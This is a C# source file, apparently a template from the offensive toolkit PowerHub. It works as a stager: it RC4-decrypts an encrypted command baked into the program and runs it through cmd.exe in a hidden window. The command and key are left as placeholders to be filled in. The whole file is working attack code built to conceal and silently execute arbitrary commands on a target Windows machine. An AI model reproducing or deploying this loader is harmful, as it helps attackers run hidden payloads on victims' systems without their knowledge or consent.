using System;
using System.Linq;

public class PowerHub
{

    public static byte[] Decrypt(byte[] pwd, byte[] data) {
        int a, i, j, k, tmp;
        int[] key, box;
        byte[] cipher;

        key = new int[256];
        box = new int[256];
        cipher = new byte[data.Length];

        for (i = 0; i < 256; i++) {
            key[i] = pwd[i % pwd.Length];
            box[i] = i;
        }
        for (j = i = 0; i < 256; i++) {
            j = (j + box[i] + key[i]) % 256;
            tmp = box[i];
            box[i] = box[j];
            box[j] = tmp;
        }
        for (a = j = i = 0; i < data.Length; i++) {
            a++;
            a %= 256;
            j += box[a];
            j %= 256;
            tmp = box[a];
            box[a] = box[j];
            box[j] = tmp;
            k = box[((box[a] + box[j]) % 256)];
            cipher[i] = (byte)(data[i] ^ k);
        }
        return cipher;
    }

    static public void Main ()
    {
        var data = new byte[] { {{CMD}} };
        byte[] key = System.Text.Encoding.UTF8.GetBytes("{{KEY}}");
        data = Decrypt(key, data);
        var cmd = System.Text.Encoding.Default.GetString(data);
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        startInfo.FileName = "cmd.exe";
        startInfo.Arguments = "/C " + cmd;
        process.StartInfo = startInfo;
        process.Start();
    }

}
